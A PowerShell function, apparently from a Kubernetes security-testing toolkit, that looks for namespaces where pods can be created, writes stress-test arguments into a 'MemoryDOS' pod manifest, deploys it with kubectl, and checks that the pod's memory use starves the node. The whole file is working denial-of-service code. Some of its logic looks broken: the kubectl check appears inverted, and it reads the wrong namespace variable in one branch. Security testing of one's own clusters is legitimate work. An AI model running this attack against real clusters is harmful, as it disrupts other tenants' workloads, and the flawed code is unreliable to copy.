
function Test-KubernetesDOS {
    [CmdletBinding(SupportsShouldProcess=$true,ConfirmImpact="High")]
    param(
        [Parameter(Mandatory = $true)]
        [String] $memory,
        #Virtual machine processor
        [Parameter(Mandatory = $true)]
        [String] $vm,
        [Parameter(Mandatory = $true)]
        [String] $timehanging
    )
    
    # Ensure kubectl is available
    if (Test-KubectlInstalledInPath) {
        exit
    }

    # Check if 'M' is present, add 'M' if absent, and output the result
    $memoryWithSuffix = if ($memory -notmatch 'M$') {"$memory`M"} else {$memory}
    # Define an array with the actions and resources to check
    $actionResourcePairs = @(
        @{ Action = "create"; Resource = "pods" },
        @{ Action = "delete"; Resource = "pods" }
    )

    $AllowedNamespaces = Get-NamespaceWhereAllActionsAreAllowed -ActionResourcePairs $actionResourcePairs
    if (-not $AllowedNamespaces) {
        $actionResourcePairs = @(
            @{ Action = "create"; Resource = "pods" }
        )
        $AllowedNamespacesCreate = Get-NamespaceWhereAllActionsAreAllowed -ActionResourcePairs $actionResourcePairs
        if($AllowedNamespacesCreate){
            Write-Host "We weren't allowed to delete pods, but we can create do you want to continue? "
            $yesOrNo = Get-YesOrNoInput
            if(-not $yesOrNo){
                return;
            }
        }
    }
    Write-Host "We are going to try DOS the Node With the provided $memory multiplied by the amount of cores $vm for a duration of $timehanging "
    if($PSCmdlet.ShouldProcess("Trying to DOS node")){

        $filePath = "$PSScriptRoot/../../Exploitpods/MemoryDOS.yaml"

        Write-Host "Trying to perform Memory DOS on system"
        (Get-Content $filePath) | ForEach-Object {
            $_ -replace 'args:.*', "args: ['--vm', '$vm', '--vm-bytes', '$memoryWithSuffix', '--time-out', '$timehanging', '--verbose']"
        } | Set-Content $filePath

        $cleanNamespace = $AllowedNamespaces[0].TrimStart('-')

        Kubectl apply -f $filePath -n $cleanNamespace
        Write-Host "To be sure it is running we wait 10 seconds few moments"
        #To be sure it is sucesfully running
        Start-Sleep -Seconds 10
        kubectl top pods memory-dos-stresstest -n $cleanNamespace

        Write-Host "This should show that an accessive amount of memory kan be used and probably starve other pods."
    }
}